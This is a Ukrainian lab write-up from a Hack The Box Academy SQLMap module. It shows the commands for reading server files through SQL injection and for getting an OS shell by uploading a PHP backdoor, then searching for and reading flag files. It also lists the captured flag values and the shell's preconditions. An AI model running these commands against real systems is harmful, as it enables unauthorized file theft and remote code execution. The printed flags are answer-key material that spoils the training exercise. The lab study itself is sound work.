# SQLMap — File Read & OS Shell

## Модуль
[SQLMap Essentials — OS Exploitation](https://academy.hackthebox.com/app/module/58/section/697)

---

## Команди

### Читання файлу через --file-read

```bash
sqlmap -u "http://TARGET/?id=1" \
  --file-read="/var/www/html/flag.txt" \
  --batch

# Результат зберігається локально:
cat ~/.local/share/sqlmap/output/TARGET/files/_var_www_html_flag.txt
```

> Якщо UNION метод не спрацьовує — sqlmap автоматично fallback на HEX decode.

### OS Shell через --os-shell

```bash
sqlmap -u "http://TARGET/?id=1" \
  --os-shell \
  --batch
# → вибрати PHP (4)
# → common locations (1) або custom → /var/www/html/
```

### Пошук флагів в os-shell

```bash
os-shell> find / -name "flag*" -not -path "*/proc/*" 2>/dev/null
# → /var/www/html/flag.txt
# → /flag.txt

os-shell> cat /flag.txt
os-shell> cat /var/www/html/flag.txt
```

---

## Результати

| Файл | Вміст |
|------|-------|
| `/var/www/html/flag.txt` | `HTB{5up3r_u53r5_4r3_p0w3rful!}` |
| `/flag.txt` | `HTB{n3v3r_run_db_45_db4}` |

---

## Як працює --os-shell
1 sqlmap перевіряє чи є права DBA (root MySQL)
2 Спроба завантажити UDF (shared library) → якщо немає прав → fallback
3 Завантажує PHP file stager через INTO OUTFILE
4 Завантажує PHP backdoor через stager
5 Виконує команди через backdoor URL

## Умови для --os-shell

| Умова | Перевірка |
|-------|-----------|
| MySQL DBA права | `--privileges` або `--is-dba` |
| `secure_file_priv` порожній | `--sql-query="SELECT @@secure_file_priv"` |
| Web root writable | Зазвичай `/var/www/html/` для www-data |
| PHP підтримується | Більшість Linux веб-серверів |

## Важливе спостереження

> `/flag.txt` — власник root, але www-data може читати (world-readable).
> `/var/www/html/flag.txt` — читається через `--file-read` (MySQL FILE privilege).
> Завжди шукати флаги в: `/`, `/root/`, `/var/www/html/`, `/home/*/`
